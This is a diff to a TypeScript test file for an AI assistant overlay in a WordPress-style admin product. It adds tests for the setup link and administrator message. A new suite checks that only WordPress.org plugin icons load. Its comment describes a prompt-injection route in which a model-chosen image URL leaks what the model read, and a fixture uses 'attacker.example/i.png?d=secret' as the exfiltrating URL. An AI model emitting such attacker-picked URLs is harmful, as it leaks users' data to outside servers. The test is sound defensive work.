@@ -1,6 +1,7 @@
 /**
  * When the assistant is turned off, the overlay offers a link that opens
- * OpenStation Preferences on the tab that turns it back on.
+ * OpenStation Preferences on the tab that turns it back on, both from
+ * the Ask AI tab itself and from a server error.
  *
  * Which tab that is comes from the server, as `settings_tab` in the
  * error data. The client used to recover it by matching the tab path out
@@ -119,6 +120,45 @@ describe( 'AiAssistant — error recovery link', () => {
 		expect( res.textContent ).not.toContain( 'Answer that arrived too late.' );
 	} );
 
+	test( 'Ask AI is offered before AI is set up, and Enter opens the setup tab', () => {
+		document.getElementById( 'desktop-mode-ai-assistant' )?.remove();
+		assistant = new AiAssistant( { ...BASE_CONFIG, isAiSupported: () => true } );
+		assistant.open();
+
+		const aiMode = document.querySelector< HTMLButtonElement >(
+			'.os-ai__mode[data-mode="ai"]',
+		)!;
+		expect( aiMode.getAttribute( 'aria-pressed' ) ).toBe( 'false' );
+
+		aiMode.click();
+		const input = document.querySelector< HTMLInputElement >( '.os-ai__input' )!;
+		expect( input.readOnly ).toBe( true );
+		expect( document.querySelector( '.os-ai__settings-link' ) ).not.toBeNull();
+
+		input.dispatchEvent( new KeyboardEvent( 'keydown', { key: 'Enter', bubbles: true } ) );
+		expect( openOsSettings ).toHaveBeenCalledWith( { tabId: 'features' } );
+	} );
+
+	test( 'Ask AI sends a user who cannot connect a provider to an administrator', () => {
+		document.getElementById( 'desktop-mode-ai-assistant' )?.remove();
+		assistant = new AiAssistant( {
+			...BASE_CONFIG,
+			isAiSupported: () => true,
+			canConnectProvider: () => false,
+		} );
+		assistant.open();
+		document.querySelector< HTMLButtonElement >( '.os-ai__mode[data-mode="ai"]' )!.click();
+
+		expect( document.querySelector( '.os-ai__settings-link' ) ).toBeNull();
+		expect( document.getElementById( 'os-ai-setup-message' )?.textContent ).toContain(
+			'administrator',
+		);
+
+		const input = document.querySelector< HTMLInputElement >( '.os-ai__input' )!;
+		input.dispatchEvent( new KeyboardEvent( 'keydown', { key: 'Enter', bubbles: true } ) );
+		expect( openOsSettings ).not.toHaveBeenCalled();
+	} );
+
 	test( 'an error with no settings hint gets no link', async () => {
 		stubErrorResponse( 500, { code: 'oops', message: 'Boom.' } );
 
@@ -129,5 +169,54 @@ describe( 'AiAssistant — error recovery link', () => {
 		expect(
 			document.querySelector( '.os-ai__state--error' )?.textContent?.trim(),
 		).toBe( 'Boom.' );
+	} );
+} );
+
+/**
+ * A plugin card's icon is a URL the model copied out of the WordPress.org
+ * results, and an image loads without a click. Only WordPress.org's hosts
+ * are fetched: a URL that a prompt injection picked could carry what the
+ * model read to someone else's server.
+ */
+describe( 'AiAssistant — admin link icons', () => {
+	let assistant: AiAssistant;
+
+	beforeEach( () => {
+		installHooksStub();
+		assistant = new AiAssistant( BASE_CONFIG );
+	} );
+
+	afterEach( () => {
+		assistant.close();
+		document
+			.querySelectorAll( '#desktop-mode-ai-assistant' )
+			.forEach( ( el ) => el.remove() );
+		clearHooksStub();
+	} );
+
+	test( 'paints a WordPress.org plugin icon and fetches no other URL', () => {
+		const pluginIcon = 'https://ps.w.org/wordpress-seo/assets/icon-128x128.gif?rev=3419908';
+		const link = { url: 'https://example.test/wp-admin/', description: '' };
+
+		assistant.open();
+		assistant[ '_showResult' ]( 'seo', {
+			answer_type: 'navigation',
+			message: 'Some SEO plugins.',
+			entity: null,
+			admin_links: [
+				{ ...link, title: 'Yoast SEO', icon: pluginIcon },
+				{ ...link, title: 'Elsewhere', icon: 'https://attacker.example/i.png?d=secret' },
+				{ ...link, title: 'Plugins', icon: 'dashicons-admin-plugins' },
+			],
+			iterations: 2,
+			exhausted: false,
+			continue: null,
+		} );
+
+		const icons = document.querySelectorAll( '.os-ai__admin-link-icon' );
+		expect( icons[ 0 ].getAttribute( 'src' ) ).toBe( pluginIcon );
+		expect( document.querySelector( '[src*="attacker.example"]' ) ).toBeNull();
+		expect( icons[ 1 ].classList.contains( 'dashicons-admin-generic' ) ).toBe( true );
+		expect( icons[ 2 ].classList.contains( 'dashicons-admin-plugins' ) ).toBe( true );
 	} );
 } );
